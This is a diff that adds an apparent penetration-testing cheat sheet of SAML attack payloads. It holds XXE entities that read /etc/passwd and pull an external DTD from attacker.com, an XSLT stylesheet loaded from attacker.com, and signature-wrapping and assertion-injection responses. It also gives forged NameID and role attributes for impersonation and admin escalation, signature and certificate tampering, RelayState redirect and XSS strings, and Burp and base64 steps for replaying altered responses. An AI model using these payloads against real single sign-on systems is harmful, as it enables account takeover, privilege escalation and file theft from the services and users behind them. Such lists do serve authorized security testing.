@@ -1,0 +1,265 @@
+# SAML Injection Payloads
+
+## ========================================
+## BASIC SAML STRUCTURE
+## ========================================
+
+# SAML Response skeleton
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+    <saml:Subject>
+      <saml:NameID>user@example.com</saml:NameID>
+    </saml:Subject>
+  </saml:Assertion>
+</samlp:Response>
+
+## ========================================
+## XXE IN SAML
+## ========================================
+
+# XML External Entity
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
+  <saml:Issuer>&xxe;</saml:Issuer>
+</samlp:Response>
+
+# XXE via DTD
+<!DOCTYPE foo [
+  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+  %dtd;
+]>
+
+## ========================================
+## SIGNATURE WRAPPING (XSW)
+## ========================================
+
+# XSW Attack #1 - Copy signed assertion
+<samlp:Response>
+  <saml:Assertion ID="original">
+    <Signature>...</Signature>
+    <saml:Subject>victim@example.com</saml:Subject>
+  </saml:Assertion>
+  <saml:Assertion ID="evil">
+    <saml:Subject>attacker@evil.com</saml:Subject>
+  </saml:Assertion>
+</samlp:Response>
+
+# XSW Attack #2 - Extensions wrapping
+<samlp:Response>
+  <saml:Extensions>
+    <saml:Assertion ID="evil">
+      <saml:Subject>attacker@evil.com</saml:Subject>
+    </saml:Assertion>
+  </saml:Extensions>
+  <saml:Assertion ID="original">
+    <Signature>...</Signature>
+  </saml:Assertion>
+</samlp:Response>
+
+## ========================================
+## COMMENT INJECTION
+## ========================================
+
+# Comment in NameID
+<saml:NameID>admin<!--@evil.com--></saml:NameID>
+
+# Comment in assertions
+<saml:AttributeValue>admin<!--comment-->@domain.com</saml:AttributeValue>
+
+## ========================================
+## ATTRIBUTE INJECTION
+## ========================================
+
+# Add admin role
+<saml:Attribute Name="Role">
+  <saml:AttributeValue>Admin</saml:AttributeValue>
+</saml:Attribute>
+
+# Privilege escalation
+<saml:Attribute Name="memberOf">
+  <saml:AttributeValue>Administrators</saml:AttributeValue>
+</saml:Attribute>
+
+## ========================================
+## XSLT INJECTION
+## ========================================
+
+# XSLT in SAML
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="http://attacker.com/evil.xsl"?>
+<samlp:Response>
+  ...
+</samlp:Response>
+
+## ========================================
+## NAMEID MANIPULATION
+## ========================================
+
+# Change NameID
+<saml:NameID>attacker@evil.com</saml:NameID>
+
+# NameID format abuse
+<saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
+  admin@target.com
+</saml:NameID>
+
+## ========================================
+## REPLAY ATTACKS
+## ========================================
+
+# Reuse SAML assertion
+1. Capture valid SAML response
+2. Remove/bypass signature validation
+3. Replay the assertion
+
+## ========================================
+## TIMESTAMP MANIPULATION
+## ========================================
+
+# Extend validity
+<saml:Conditions NotBefore="2020-01-01T00:00:00Z" 
+                 NotOnOrAfter="2099-12-31T23:59:59Z">
+</saml:Conditions>
+
+## ========================================
+## RECIPIENT CONFUSION
+## ========================================
+
+# Change recipient
+<saml:SubjectConfirmationData 
+  Recipient="http://attacker.com/acs"
+  NotOnOrAfter="2099-12-31T23:59:59Z">
+</saml:SubjectConfirmationData>
+
+## ========================================
+## ASSERTION INJECTION
+## ========================================
+
+# Multiple assertions
+<samlp:Response>
+  <saml:Assertion ID="legit">
+    <Signature>valid</Signature>
+    <saml:Subject>user@example.com</saml:Subject>
+  </saml:Assertion>
+  <saml:Assertion ID="malicious">
+    <saml:Subject>admin@example.com</saml:Subject>
+  </saml:Assertion>
+</samlp:Response>
+
+## ========================================
+## XSS IN SAML
+## ========================================
+
+# XSS in SAML attributes
+<saml:AttributeValue><script>alert(1)</script></saml:AttributeValue>
+
+# XSS in NameID
+<saml:NameID><img src=x onerror=alert(1)></saml:NameID>
+
+## ========================================
+## SIGNATURE BYPASS
+## ========================================
+
+# Remove signature
+Delete <Signature> element entirely
+
+# Null signature
+<Signature xmlns="http://www.w3.org/2000/09/xmldsig#">
+  <SignatureValue></SignatureValue>
+</Signature>
+
+## ========================================
+## CERTIFICATE MANIPULATION
+## ========================================
+
+# Replace certificate
+<ds:X509Certificate>ATTACKER_CERTIFICATE</ds:X509Certificate>
+
+# Certificate confusion
+Use same certificate for multiple apps
+
+## ========================================
+## RELAY STATE MANIPULATION
+## ========================================
+
+# Open redirect via RelayState
+RelayState=http://attacker.com
+
+# XSS via RelayState
+RelayState=javascript:alert(1)
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Intercept SAML response
+Use Burp Suite to capture
+
+# 2. Decode Base64
+echo "BASE64" | base64 -d
+
+# 3. Modify XML
+Change assertions, attributes
+
+# 4. Re-encode
+cat modified.xml | base64 -w 0
+
+# 5. Test
+Forward modified request
+
+## ========================================
+## TOOLS
+## ========================================
+
+# SAML Raider (Burp Extension)
+- Decode/encode SAML
+- Signature manipulation
+- XSW attacks
+
+# SAMLExtractor
+python samlextractor.py
+
+# Manual testing
+- Burp Suite
+- Base64 decode/encode
+- XML editors
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Admin escalation
+<saml:Attribute Name="Role">
+  <saml:AttributeValue>Administrator</saml:AttributeValue>
+</saml:Attribute>
+
+# Example 2: User impersonation
+<saml:NameID>ceo@company.com</saml:NameID>
+
+# Example 3: XXE file read
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<saml:Issuer>&xxe;</saml:Issuer>
+
+## ========================================
+## COMMON VULNERABILITIES
+## ========================================
+
+# No signature validation
+# Weak signature algorithm (SHA1)
+# XXE not disabled
+# No replay protection
+# Missing timestamp validation
+# Weak certificate validation
+
+## ========================================
+## REAL-WORLD SCENARIOS
+## ========================================
+
+# SSO bypass
+# Privilege escalation
+# Account takeover
+# Data exfiltration via XXE
